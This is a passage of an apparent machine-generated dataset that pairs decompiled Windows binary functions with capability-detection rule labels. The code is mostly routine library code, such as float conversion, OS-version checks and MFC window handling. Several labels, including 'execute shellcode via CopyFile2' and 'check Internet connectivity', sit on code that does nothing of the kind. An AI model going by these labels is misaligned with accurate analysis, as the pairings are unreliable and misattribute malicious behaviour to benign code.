code_r0x004834d6;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x004834dd;\ncode_r0x004834d6:\n                        do {\n                            var_4h = 1;\ncode_r0x004834dd:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x004834eb;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x004834eb:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4b9164 - *0x4b9168) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4b9164 < iVar12) {\n                if (iVar12 < *0x4b9160) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x4b9174;\n                    iVar4 = *0x4b916c + (*0x4b916c >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4b916c & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x4b916c + (*0x4b916c >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x4b916c & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x4b9174 + *0x4b9160;\n                    uVar5 = 1;\n                }\n                goto code_r0x004838a2;\n            }\n            var_10h = *0x4b9164 - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x4b9168 - 1;\n            iVar12 = *0x4b9168 + (*0x4b9168 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x4b9168 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0048368e;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0048368e:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x4b916c + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x004838a2:\n    var_20h = iVar12 << (0x1fU - *0x4b916c & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x4b9170 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x4b9170 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3660
    },
    "00488417": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00488417(void)\n\n{\n    code *pcVar1;\n    uint arg_8h;\n    uint var_98h;\n    uint32_t var_94h;\n    int32_t var_88h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    var_98h = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&var_98h);\n    if ((var_88h != 2) || (pcVar1 = 0x488413,  var_94h < 5)) {\n        pcVar1 = fcn.004883ae;\n    }\n    arg_8h = 0x4b94e8;\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x4b94e8, pcVar1);\n    (**0x4b94e8)();\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 225
    },
    "00488723": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00488723(uint *param_1)\n\n{\n    if (*(param_1 + 1) != '\\0') {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(*param_1);\n        *(param_1 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004888ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004888ad(uint *param_1)\n\n{\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint uStack156;\n    uint32_t uStack152;\n    int32_t iStack148;\n    int32_t iStack140;\n    uchar auStack124 [116];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack124;\n    fcn.0048873a();\n    param_1[2] = 0x400000;\n    param_1[1] = 0x400000;\n    *param_1 = 0x3c;\n    *(param_1 + 3) = 0;\n    fcn.00462290(&uStack156, 0, 0x94);\n    uStack156 = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&uStack156);\n    if (iStack140 == 2) {\n        if (uStack152 < 5) goto code_r0x00488929;\n    }\n    else if ((iStack140 != 1) || ((uStack152 < 5 && ((uStack152 != 4 || (iStack148 == 0)))))) goto code_r0x00488929;\n    *(param_1 + 3) = 1;\ncode_r0x00488929:\n    param_1[4] = 0x800;\n    param_1[5] = 0x4a1314;\n    iVar1 = fcn.004884f7();\n    if (iVar1 < 0) {\n        *0x4bc249 = 1;\n    }\n    fcn.0045e747(unaff_ESI);\n    return;\n}\n",
        "token_count": 386
    },
    "00411230": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411230(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    uint unaff_EDI;\n    int32_t **in_FS_OFFSET;\n    uchar auStack128 [8];\n    int32_t iStack120;\n    code *pcStack116;\n    int32_t iStack112;\n    code *pcStack108;\n    int32_t *piStack52;\n    uint uStack44;\n    uint uStack24;\n    int32_t *piStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uStack12 = 0xffffffff;\n    uStack16 = 0x48f0c8;\n    piStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack20;\n    piVar1 = *(in_ECX + 0x54);\n    fcn.00427b70(auStack128);\n    iVar3 = fcn.004281b8(arg_ch, arg_10h);\n    if (iVar3 < 0) {\n        pcStack108 = vtable.CRectTracker.0;\n        fcn.00427884();\n        uStack24 = 0;\n        iVar3 = fcn.004285c0(unaff_EDI, arg_ch, arg_10h, piVar1[0x27]);\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_MessageBeep)(0);\n            pcVar2 = pcStack116;\n            iVar3 = iStack120;\n            if (iStack112 < iStack120) {\n                iStack120 = iStack112;\n                iStack112 = iVar3;\n            }\n            if (pcStack108 < pcStack116) {\n                pcStack116 = pcStack108;\n                pcStack108 = pcVar2;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_IntersectRect)(&stack0xffffff70, &iStack120, piVar1 + 0x17);\n            if (iVar3 != 0) {\n                uVar4 = piVar1[0x16];\n                if ((uVar4 & 8) == 0) {\n                    uVar4 = uVar4 & 0xffffffef | 8;\n                }\n                else {\n                    uVar4 = uVar4 & 0xfffffff7 | 0x10;\n                }\n                piVar1[0x16] = uVar4;\n                (**(*piVar1 + 0x5c))(1);\n                fcn.004286f6(0, &stack0xffffff78, 0);\n                fcn.004286f6(0, 0, 0);\n            }\n        }\n        uStack44 = 0xffffffff;\n        fcn.0042779e();\n    }\n    else {\n        iVar3 = fcn.00428588(unaff_EDI, arg_ch, arg_10h, piVar1[0x27], 0);\n        if (iVar3 != 0) {\n            (**(*piVar1 + 0x5c))(1);\n            fcn.004286f6(0, &stack0xffffff78, 0);\n            fcn.004286f6(0, 0, 0);\n        }\n    }\n    fcn.00418521();\n    *in_FS_OFFSET = piStack52;\n    return;\n}\n",
        "token_count": 761
    },
    "00413500": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00413500(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    uVar1 = (**0x4b94e8)();\n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        fcn.00401200(arg_8h, arg_ch, 0x20, uVar1);\n        iVar2 = fcn.0045f3a0(arg_8h + 0x40, 0x26, arg_ch + 0x20, 0x26);\n        if (iVar2 == 0) {\n            fcn.00401200(arg_8h + 0x66, arg_ch + 0x46, 0x20, uVar1);\n            iVar2 = fcn.0045f3a0(arg_8h + 0xa6, 0x36, arg_ch + 0x66, 0x36);\n            if ((iVar2 == 0) &&\n               ((*(arg_ch + 0x26) == 0 ||\n                (iVar2 = fcn.0045f3a0(arg_8h + 0xdc, *(arg_ch + 0x26), arg_ch + 0x9c, *(arg_ch + 0x26)),  iVar2 == 0))))\n            {\n                *(arg_8h + 0x44) = 0xdc;\n                fcn.004020b0();\n                return arg_8h;\n            }\n        }\n    }\n    fcn.004020b0();\n    return 0;\n}\n",
        "token_count": 370
    },
    "004135bd": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004135bd(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    uVar1 = (**0x4b94e8)();\n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        fcn.00401240(arg_8h, arg_ch, 0x20, uVar1);\n        iVar2 = fcn.0045f3a0(arg_8h + 0x20, 0x26, arg_ch + 0x40, 0x26);\n        if (iVar2 == 0) {\n            fcn.00401240(arg_8h + 0x46, arg_ch + 0x66, 0x20, uVar1);\n            iVar2 = fcn.0045f3a0(arg_8h + 0x66, 0x36, arg_ch + 0xa6, 0x36);\n            if ((iVar2 == 0) &&\n               ((*(arg_ch + 0x46) == 0 ||\n                (iVar2 = fcn.0045f3a0(arg_8h + 0x9c, *(arg_ch + 0x46), arg_ch + 0xdc, *(arg_ch + 0x46)),  iVar2 == 0))))\n            {\n                *(arg_8h + 0x24) = 0x9c;\n                fcn.004020b0();\n                return arg_8h;\n            }\n        }\n    }\n    fcn.004020b0();\n    return 0;\n}\n",
        "token_count": 372
    },
    "0041c85e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.0041c85e(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar3 = *(in_ECX + 0x4c);\n    if (iVar3 != 0) {\n        puVar1 = iVar3 + 0x40;\n        var_4h = *(iVar3 + 0x44);\n        while (var_4h != 0) {\n            if (var_4h == 0) {\n                fcn.00411e42(puVar1);\n                pcVar2 = swi(3);\n                iVar3 = (*pcVar2)();\n                return iVar3;\n            }\n            if (*(var_4h + 8) == arg_8h) {\n                return var_4h;\n            }\n            puVar1 = &var_4h;\n            fcn.0041c1ce();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "004312f6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __thiscall fcn.004312f6(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = param_3 + 0x40;\n    param_1[1] = param_3;\n    if (param_3 <= uVar3) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, uVar3);\n        *param_1 = iVar1;\n        if (iVar1 != 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1);\n            fcn.0041314e(uVar2, param_1[1], uVar3, param_1[1]);\n            iVar1 = fcn.00430ffd(uVar2);\n            param_1[2] = iVar1 == 0;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*param_1);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "00452a1f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00452a1f(void)\n\n{\n    int32_t *piVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 2;\n    *(extraout_ECX + 0x30) = 0;\n    fcn.00431b26(extraout_ECX + 0x38);\n    fcn.00431b26(extraout_ECX + 0x3c);\n    fcn.00431c50();\n    piVar1 = *(extraout_ECX + 0x20);\n    if (piVar1 != NULL) {\n        if (*(extraout_ECX + 0x2c) != 0) {\n            fcn.0044f150(0, 1);\n            *(extraout_ECX + 0x2c) = 0;\n        }\n        if (piVar1[0x30] == extraout_ECX) {\n            piVar1[0x30] = 0;\n        }\n        (**(*piVar1 + 0xc0))(extraout_ECX);\n    }\n    fcn.00432f21();\n    *(unaff_EBP + -4) = 1;\n    fcn.00454466();\n    fcn.00402740();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00450fd0();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 396
    },
    "00455b4f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00455b4f(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.004119db();\n    *param_1 = vtable.COleFrameHook.0;\n    fcn.0040f620();\n    param_1[0x11] = vtable.COleFrameHook::XOleInPlaceFrame.0;\n    param_1[0x12] = vtable.COleFrameHook::XOleCommandTarget.0;\n    param_1[10] = param_3;\n    param_1[8] = param_2;\n    param_1[9] = NULL;\n    param_1[0xb] = *(param_2 + 0x20);\n    param_1[0xd] = NULL;\n    param_1[0xe] = NULL;\n    param_1[0xc] = NULL;\n    param_1[0xf] = NULL;\n    *(param_2 + 0x80) = param_1;\n    return param_1;\n}\n",
        "token_count": 236
    },
    "0045a52f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0045a52f(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627e2(0xc);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = fcn.00411579(0x1c);\n    *(unaff_EBP + -0x14) = iVar1;\n    *(unaff_EBP + -4) = 1;\n    if (iVar1 == 0) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = fcn.0045a473(*(unaff_EBP + 8));\n    }\n    iVar1 = puVar2[5];\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + 8) = puVar2;\n    if (iVar1 == 0) {\n        (***puVar2)(1);\n        *(unaff_EBP + 8) = 0;\n    }\n    else {\n        fcn.0043026e();\n        fcn.0043039f(0xb);\n        fcn.00430a08(puVar2);\n        fcn.0043040c(0xb);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 327
    },
    "0045a5f6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.0045a5f6(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_retaddr;\n    \n    iVar3 = fcn.0043026e();\n    fcn.0043039f(0xb);\n    uVar4 = 0;\n    puVar1 = *(iVar3 + 0x40);\n    while (puVar2 = puVar1,  puVar2 != NULL) {\n        puVar1 = puVar2[6];\n        iVar3 = fcn.004115b3(unaff_retaddr, puVar2 + 1);\n        if (iVar3 != 0) {\n            fcn.00430a21(puVar2);\n            uVar4 = 1;\n            (***puVar2)(1);\n        }\n    }\n    fcn.0043040c(0xb);\n    return uVar4;\n}\n",
        "token_count": 211
    },
    "0045a651": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0045a651(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    \n    iVar2 = fcn.0043026e();\n    puVar3 = 0xb;\n    fcn.0043039f(0xb);\n    while (puVar1 = *(iVar2 + 0x40),  puVar1 != NULL) {\n        puVar3 = puVar1;\n        fcn.00430a21();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    fcn.0043040c(0xb, puVar3);\n    return;\n}\n",
        "token_count": 152
    },
    "0045b00a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045b00a(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ole32.dll_CoRegisterMessageFilter)(param_1 + 0x40, 0);\n    if (iVar1 == 0) {\n        *(param_1 + 0x20) = 1;\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "00411bc6": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.00411bc6(void)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint16_t uVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iStack148;\n    int32_t iStack140;\n    uchar auStack136 [12];\n    uchar auStack124 [116];\n    uint32_t uStack8;\n    \n    uStack8 = *0x4b8030 ^ auStack124;\n    uVar3 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar6 = uVar3;\n    iStack148 = uVar3 >> 0x10;\n    if ((4 < iVar6) && (5 < iStack148)) {\n        if (0x20 < iVar6) {\n            iVar6 = 0x20;\n        }\n        iVar8 = iVar6 + 0xf >> 4;\n        iVar9 = ((iVar6 + -4) / 2 + iVar8 * 0x10) - iVar6;\n        if (0xc < iVar9) {\n            iVar9 = 0xc;\n        }\n        if (0x20 < iStack148) {\n            iStack148 = 0x20;\n        }\n        fcn.00462290(auStack136);\n        puVar4 = auStack136 + (iStack148 + -6 >> 1) * iVar8 * 2;\n        puVar5 = 0x492b1c;\n        iStack140 = 5;\n        do {\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n            uVar7 = ~(uVar1 << (iVar9 & 0x1f));\n            *puVar4 = uVar7 >> 8;\n            puVar4[1] = uVar7;\n            puVar4 = puVar4 + iVar8 * 2;\n            iStack140 = iStack140 + -1;\n        } while (iStack140 != 0);\n        uVar3 = 1;\n        *0x4bb628 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar6, iStack148, 1);\n        if (*0x4bb628 == 0) {\n            *0x4bb628 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n        }\n        fcn.0045e747(uVar3);\n        return;\n    }\n    fcn.0046230a(&stack0xffffff54, 0x4a76e8);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 608
    },
    "004184e3": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.004184e3(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uStack16;\n    \n    iVar2 = fcn.00430e98(0x411e5c);\n    if (iVar2 == 0) {\n        uStack16 = 0x4b62b8;\n        fcn.0046230a(&uStack16, 0x4a76e8);\n        pcVar1 = swi(3);\n        iVar2 = (*pcVar1)();\n        return iVar2;\n    }\n    uVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar2 + 0x68) = uVar3;\n    uVar3 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar2 + 0x70) = uVar3 >> 0x10;\n    *(iVar2 + 0x6c) = uVar3;\n    return iVar2 + 0x58;\n}\n",
        "token_count": 226
    },
    "00419d8e": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419d8e(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint32_t uVar3;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == 0) {\n        if (uVar3 == 0) {\n            return 0;\n        }\n        fcn.0041625d();\n        var_28h = uVar3;\n        (**(*in_ECX + 0xc))(uVar3, 0xffffffff, &var_2ch, 0);\n        if (var_4h != 0) {\n            arg_8h = 0;\ncode_r0x00419e11:\n            uVar2 = (**(*in_ECX + 0xc))(uVar3, arg_8h, 0, 0);\n            return uVar2;\n        }\n    }\n    else {\n        iVar1 = fcn.00430e98(0x411e5c);\n        if (iVar1 == 0) {\n            iVar1 = fcn.00411e42();\n        }\n        if ((*(iVar1 + 0xdc) != in_ECX[8]) && (iVar1 = fcn.0041923e(arg_ch, 0),  iVar1 == 0)) {\n            if (uVar3 == 0) {\n                return 0;\n            }\n            goto code_r0x00419e11;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 387
    },
    "0041e288": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e288(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x20));\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        *(in_ECX + 0xac) = arg_8h;\n        *(in_ECX + 0xb0) = arg_ch;\n        *(in_ECX + 0xa4) = arg_10h;\n        *(in_ECX + 0xa8) = arg_14h;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x420, 0, arg_10h & 0xffff | arg_14h << 0x10);\n        (*pcVar1)(*(in_ECX + 0x20), 0x41f, 0, arg_8h & 0xffff | arg_ch << 0x10);\n        if (0x5ffff < *0x4b66f8) {\n            uVar3 = (*pcVar1)(*(in_ECX + 0x20), 0x43a, 0, 0);\n            *(in_ECX + 0xac) = uVar3 & 0xffff;\n            *(in_ECX + 0xb0) = uVar3 >> 0x10;\n        }\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x20), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 409
    },
    "0041e5a2": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
